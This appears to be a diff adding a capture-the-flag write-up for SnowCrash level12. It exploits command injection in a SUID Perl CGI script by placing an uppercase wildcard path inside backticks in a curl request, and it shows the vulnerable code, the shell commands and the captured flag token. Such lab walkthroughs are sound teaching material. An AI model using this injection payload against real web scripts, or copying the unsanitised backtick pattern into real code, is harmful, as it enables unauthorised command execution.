@@ -1,0 +1,52 @@
+In this level, we have "level12.pl" a perl script like back in level04 with s(SUID) permission as well.
+
+"level12@SnowCrash:~$ cat level12.pl 
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));"
+
+Base on our knowledge back in level04, we can see that the script is trying to process "param("x")" with the subroutine t.
+If we could give the program `/bin/getflag` as the param("x") we could potentially run the getflag as user flag12 like what we did back in level04.
+But param("x") will be translate to uppercase, "$xx =~ tr/a-z/A-Z/;", and `/bin/getflag` will become `/BIN/GETFLAG` and system command is case sensitive.
+
+We could create a file which run the getflag and echo the result into another file, and name this file in full uppercase. Since we dont have the permission to create neither a new folder or file in to root "/" directory, we need another way to bypass the "/tmp" path.
+We could use a wildcard "*" in the path and the system will try to find the file for us.
+
+level12@SnowCrash:~$ echo "/bin/getflag > /tmp/exploit_level12" > /tmp/GETFLAG
+level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
+level12@SnowCrash:~$ /*/GETFLAG
+level12@SnowCrash:~$ cat /tmp/exploit_level12
+Check flag.Here is your token : 
+Nope there is no token here for you sorry. Try again :)
+
+It's working, now lets give `/*/GETFLAG` as the param("x") for the program with curl.
+
+level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/GETFLAG`'
+..level12@SnowCrash:~$ cat /tmp/exploit_level12
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
